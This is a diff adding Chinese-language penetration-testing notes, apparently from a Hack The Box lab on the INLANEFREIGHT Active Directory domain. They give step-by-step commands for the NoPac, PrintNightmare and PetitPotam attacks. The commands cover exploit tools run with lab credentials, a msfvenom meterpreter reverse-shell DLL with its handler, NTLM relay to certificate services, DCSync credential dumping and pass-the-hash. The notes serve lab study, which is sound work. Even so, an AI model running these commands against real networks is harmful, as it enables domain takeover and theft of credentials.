@@ -66,6 +66,66 @@ C:\htb> Enter-PSSession -ComputerName DEV01 -Credential INLANEFREIGHT\backupadm 
 
 
 2021-2024年的攻击：
+
 NoPac (SamAccountName 欺骗)
+该漏洞包含两个 CVE，2021-42278 和 2021-42287，允许通过一个命令，将任何标准域用户的权限提升至域管理员 (Domain Admin) 级别的域内权限提升 (intra-domain privilege escalation)
+  https://www.sophos.com/en-us/blog/nopac-a-tale-of-two-vulnerabilities-that-could-end-in-ransomware
+git clone https://github.com/SecureAuthCorp/impacket.git      安装Impacket
+python setup.py install 
+git clone https://github.com/Ridter/noPac.git      克隆工具
+sudo python3 scanner.py inlanefreight.local/forend:Klmcargo2 -dc-ip 172.16.5.5 -use-ldap      扫描漏洞：Current ms-DS-MachineAccountQuota 不等于 0
+sudo python3 noPac.py INLANEFREIGHT.LOCAL/forend:Klmcargo2 -dc-ip 172.16.5.5  -dc-host ACADEMY-EA-DC01 -shell --impersonate administrator -use-ldap      System权限用户攻击
+目标通过 smbexec.py 建立了一个 半交互式 shell 会话 (semi-interactive shell session)，在使用 smbexec shell 时，需要使用确切的路径，而不是使用 cd 来浏览目录结构
+sudo python3 noPac.py INLANEFREIGHT.LOCAL/forend:Klmcargo2 -dc-ip 172.16.5.5  -dc-host ACADEMY-EA-DC01 --impersonate administrator -use-ldap -dump -just-dc-user INLANEFREIGHT/administrator      获得用户信息
+操作安全 (opsec) 或保持“安静”是一个考虑因素，要避免使用像 smbexec.py 这样的工具
+
+
 PrintNightmare (远程)
+两个漏洞（CVE-2021-34527 和 CVE-2021-1675）
+git clone https://github.com/cube0x0/CVE-2021-1675.git
+pip3 uninstall impacket
+git clone https://github.com/cube0x0/impacket
+cd impacket
+python3 ./setup.py install
+rpcdump.py @172.16.5.5 | egrep 'MS-RPRN|MS-PAR'      枚举漏洞
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=172.16.5.225 LPORT=8080 -f dll > backupscript.dll      生成dll载荷
+sudo smbserver.py -smb2support CompData /path/to/backupscript.dll            smb共享，托管dll
+——      msf监听
+[msf](Jobs:0 Agents:0) >> use exploit/multi/handler
+[*] Using configured payload generic/shell_reverse_tcp
+[msf](Jobs:0 Agents:0) exploit(multi/handler) >> set PAYLOAD windows/x64/meterpreter/reverse_tcp
+PAYLOAD => windows/x64/meterpreter/reverse_tcp
+[msf](Jobs:0 Agents:0) exploit(multi/handler) >> set LHOST 172.16.5.225
+LHOST => 10.3.88.114
+[msf](Jobs:0 Agents:0) exploit(multi/handler) >> set LPORT 8080
+LPORT => 8080
+[msf](Jobs:0 Agents:0) exploit(multi/handler) >> run
+——
+sudo python3 CVE-2021-1675.py inlanefreight.local/forend:Klmcargo2@172.16.5.5 '\<攻击主机的IP地址>\共享名\backupscript.dll'      攻击
+
 PetitPotam (MS-EFSRPC)
+(CVE-2021-36942) 是一个 LSA 欺骗漏洞，已于 2021 年 8 月修补
+允许未经身份验证的攻击者通过滥用微软的加密文件系统远程协议 (Encrypting File System Remote Protocol, MS-EFSRPC)，利用本地安全机构远程协议 (Local Security Authority Remote Protocol, LSARPC)
+强制域控制器通过端口 445 使用 NTLM 对另一台主机进行身份验证
+  https://dirkjanm.io/ntlm-relaying-to-ad-certificate-services/
+sudo ntlmrelayx.py -debug -smb2support --target http://ACADEMY-EA-CA01.INLANEFREIGHT.LOCAL/certsrv/certfnsh.asp --adcs --template DomainController      指定 CA 主机
+不知道CA位置，用 https://github.com/zer1t0/certi 定位
+在2窗口中
+python3 PetitPotam.py <攻击主机 IP> <域控制器 IP> 
+  https://github.com/topotam/PetitPotam
+回到1窗口
+python3 /opt/PKINITtools/gettgtpkinit.py INLANEFREIGHT.LOCAL/ACADEMY-EA-DC01\$ -pfx-base64 MIIStQIBAzCCEn8GCSqGSI...SNIP...CKBdGmY= dc01.ccache      请求票据
+export KRB5CCNAME=dc01.ccache      保存票据
+secretsdump.py -just-dc-user INLANEFREIGHT/administrator -k -no-pass "ACADEMY-EA-DC01$"@ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL      执行 DCSync 并检索域中一个或所有 NTLM 密码哈希
+crackmapexec smb 172.16.5.5 -u administrator -H 88ad09182de639ccc6579eb0849751cf      PtH
+OR
+获得了目标的 TGT，也可以使用 PKINITtools 中的 getnthash.py
+python /opt/PKINITtools/getnthash.py -key 70f805f9c91ca91836b670447facb099b4b2b7cd5b762386b3369aa16d912275 INLANEFREIGHT.LOCAL/ACADEMY-EA-DC01$      请求哈希
+secretsdump.py -just-dc-user INLANEFREIGHT/administrator "ACADEMY-EA-DC01$"@172.16.5.5 -hashes aad3c435b514a4eeaad3b935b51304fe:313b6f423cd1ee07e91315b4919fb4ba      执行 DCSync
+也能用 PAC 中包含的 NT 哈希，以用们之前请求 TGT 时获得的 AS-REP 加密密钥来解密
+OR
+在 Windows 攻击主机上使用 Rubeus 工具和该证书来请求 TGT 票据，一次性执行票据传递 (pass-the-ticket, PTT)
+C:\Tools> .\Rubeus.exe asktgt /user:ACADEMY-EA-DC01$ /certificate:MIIStQIBAzC...SNIP...IkHS2vJ51Ry4= /ptt
+OR
+在 Windows 攻击主机上使用 Mimikatz 执行 DCSync
+
